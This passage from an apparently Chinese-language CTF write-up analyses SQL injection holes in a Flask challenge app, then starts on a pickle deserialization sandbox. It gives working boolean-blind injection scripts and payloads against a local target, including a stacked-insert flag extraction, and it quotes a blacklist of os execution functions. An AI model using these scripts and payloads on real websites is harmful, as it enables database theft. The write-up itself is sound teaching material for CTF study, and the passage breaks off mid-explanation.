class="string">"user"</span>, [<span class="string">"NULL"</span>, <span class="string">"'%s'"</span> % form.username.data, <span class="string">"'%s'"</span> % form.email.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % generate_password_hash(form.password.data), <span class="string">"''"</span>, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Congratulations, you are now a registered user!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title=<span class="string">'Register'</span>, form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中注册的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistrationForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</span><br><span class="line">    email = StringField(<span class="string">'Email'</span>, validators=[DataRequired(), Email()])</span><br><span class="line">    password = PasswordField(<span class="string">'Password'</span>, validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(</span><br><span class="line">        <span class="string">'Repeat Password'</span>, validators=[DataRequired(), EqualTo(<span class="string">'password'</span>)])</span><br><span class="line">    submit = SubmitField(<span class="string">'Register'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_username</code>在进行<code>mysql.One</code>前进行了正则匹配的过滤和审核，而<code>validate_email</code>仅仅通过<code>validators=[DataRequired(), Email()]</code>来匹配。</p><p><code>Email()</code>的关键源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">super(Email, self).__init__(<span class="string">r'^.+@([^.@][^@]+)$'</span>, re.IGNORECASE, message)</span><br></pre></td></tr></table></figure></p><p>其正则规则为<code>^.+@([^.@][^@]+)$</code>，也就是说对email而言，即使提交如<code>&#39;&quot;#a@qq.com</code>包含单引号，双引号，注释符等敏感字符的形式也是能通过的。</p><p>转到<code>others.py</code>中<code>mysql.One()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = self.db_session.execute(sql).fetchone()</span><br><span class="line">        <span class="keyword">if</span> res == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></p><p>跟入<code>Sel()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sel</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = <span class="string">"select "</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> feildname)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"from "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    <span class="keyword">if</span> where != &#123;&#125;:</span><br><span class="line">        sql += <span class="string">"where "</span> + <span class="string">""</span>.join(i + <span class="string">" "</span> + where_symbols + <span class="string">" "</span> +</span><br><span class="line">                                  str(where[i]) + <span class="string">" "</span> + l + <span class="string">" "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> order != <span class="string">""</span>:</span><br><span class="line">        sql += <span class="string">"order by "</span> + <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> order)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> sql</span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;your input email&apos;</span><br></pre></td></tr></table></figure></p><p>重新看一下<code>validate_email</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p>数据库语言返回成功，会提示<code>Please use a different email address.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=1#@qq.com</span><br></pre></td></tr></table></figure></p><p>提示：Please use a different email address.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=0#@qq.com</span><br></pre></td></tr></table></figure><p>什么都没返回</p><p>布尔注入脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/register"</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">"(SELECT/**/GROUP_CONCAT(schema_name)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span></span><br><span class="line">tables = <span class="string">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span></span><br><span class="line">columns = <span class="string">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span></span><br><span class="line">flag = <span class="string">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"test'/**/or/**/ascii(substr("</span>+ flag +<span class="string">",%d,1))=%d#@qq.com"</span> % (i,j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">'csrf_token'</span>: token,</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'email'</span>:payload,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'password2'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=post_data)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">        token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Please use a different email address."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="注入点二"><a href="#注入点二" class="headerlink" title="注入点二"></a>注入点二</h3><p>看看<code>routes.py</code>中修改profile代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></span><br><span class="line">    form = EditProfileForm(current_user.username)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.note = form.note.data</span><br><span class="line">        res = mysql.Mod(<span class="string">"user"</span>, &#123;<span class="string">"id"</span>: current_user.id&#125;, &#123;</span><br><span class="line">                        <span class="string">"username"</span>: <span class="string">"'%s'"</span> % current_user.username, <span class="string">"note"</span>: <span class="string">"'%s'"</span> % current_user.note&#125;)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">'Your changes have been saved.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'edit_profile'</span>))</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form.username.data = current_user.username</span><br><span class="line">        form.note.data = current_user.note</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'edit_profile.html'</span>, title=<span class="string">'Edit Profile'</span>,</span><br><span class="line">                           form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中修改profile的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_note</span><span class="params">(self, note)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_\'\(\) \.\_\*\`\-\@\=\+\&gt;\&lt;]*$"</span>, note.data) == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">"Don't input invalid charactors!"</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_note</code>大部分敏感字符都没过滤</p><p>跟进Mod函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mod</span><span class="params">(self, tablemame, where, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"update "</span> + tablemame + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"set "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(values[i]) + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"where "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(where[i]) + <span class="string">" and "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set username=&apos;kira&apos;,note=&apos;your input note&apos; where id=1</span><br></pre></td></tr></table></figure></p><p>测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x3125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>About me那里显示0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x5125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>About me那里显示1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:<span class="string">"ca823fed-c8b9-450c-8ec9-fc7626ce8326"</span>&#125;</span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/edit_profile"</span></span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">csrf_token_re = <span class="string">r'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"&gt;'</span></span><br><span class="line">csrf_token = re.findall(csrf_token_re, r.content)[<span class="number">0</span>]</span><br><span class="line">note_re = <span class="string">r'&lt;input class="form-control" id="note" name="note" type="text" value="(\d)"&gt;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789"</span>+string.letters+<span class="string">"!@#$^&amp;*()&#123;&#125;=+`~_"</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"csrf_token"</span>: csrf_token,</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"kira"</span>,</span><br><span class="line">            <span class="string">"note"</span>: <span class="string">"123' and (select flllllag like binary 0x&#123;&#125;25 from flaaaaag) and '1'='1"</span>.format((flag+j).encode(<span class="string">'hex'</span>)),</span><br><span class="line">            <span class="string">"submit"</span>: <span class="string">"Submit"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r =requests.post(url=url,data=data,cookies=cookies,timeout=<span class="number">2.5</span>)</span><br><span class="line">        note_info = re.findall(note_re, r.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> note_info == <span class="string">'1'</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="注入点三"><a href="#注入点三" class="headerlink" title="注入点三"></a>注入点三</h3><p>看看<code>routes.py</code>中post内容的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = PostForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">"post"</span>, [<span class="string">'NULL'</span>, <span class="string">"'%s'"</span> % form.post.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % current_user.id, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Your post is now live!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中<code>PostForm()</code>的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    post = StringField(<span class="string">'Say something'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure></p><p>啥过滤都没！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, tablename, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"insert into "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"values ("</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>]</span><br><span class="line">    sql += <span class="string">")"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into post values (NULL,&apos;yout input&apos;,&apos;1&apos;,&apos;2018-04-15&apos;)</span><br></pre></td></tr></table></figure></p><p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos;,&apos;1&apos;,&apos;2018-04-15&apos;),(NULL,(select flllllag from flaaaaag),&apos;1&apos;,&apos;2018-04-15&apos;)#</span><br></pre></td></tr></table></figure></p><p>flag出来了，问题是所有人都可以看到的，比赛中直接翻就能看到其他人注出来的flag，所以在注入时候需要加密一下。</p><p>这里可以使用mysql的<code>ENCODE(string,pass),DECODE(string,pass)</code>函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> select hex(encode((select flllllag from flaaaaag),'kirakira'));</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| hex(encode((select flllllag from flaaaaag),'kirakira'))    |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| 2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span> select decode(unhex('2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'),'kirakira');</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| decode(unhex('2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'),'kirakira') |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| QWB&#123;us1ng_val1dator_caut1ous&#125;                                                          |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language2"><a href="#Python-is-the-best-language2" class="headerlink" title="Python is the best language2"></a>Python is the best language2</h2><p>接着下一题，在<code>others.py</code>里发现了奇怪的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</span><br><span class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</span><br><span class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</span><br><span class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</span><br><span class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</span><br><span class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        super(FilterException, self).__init__(</span><br><span class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</span><br><span class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> Unpkler(file).load()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(str)</span>:</span></span><br><span class="line">    file = StringIO(str)</span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure></p><p>这里存在反序列化漏洞以及基本的沙箱逃逸问题。</p><h3 id="pickle序列化"><a href="#pickle序列化" class="headerlink" title="pickle序列化"></a>pickle序列化</h3><p>Python提供两个模块来实现序列化：<code>cPickle</code>和<code>pickle</code>。这两个模块功能是一样的，区别在于<code>cPickle</code>是C语言写的，速度快，<code>pickle</code>是纯Python写的，速度慢。</p><p><code>pickle</code>模块提供的相关函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将指定的Python对象通过pickle序列化作为bytes对象返回，而不是将其写入文件</span></span><br><span class="line">dumps(obj, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回</span></span><br><span class="line">loads(bytes_object, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于`Pickler(file, protocol).dump(obj)`</span></span><br><span class="line">dump(obj, file, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 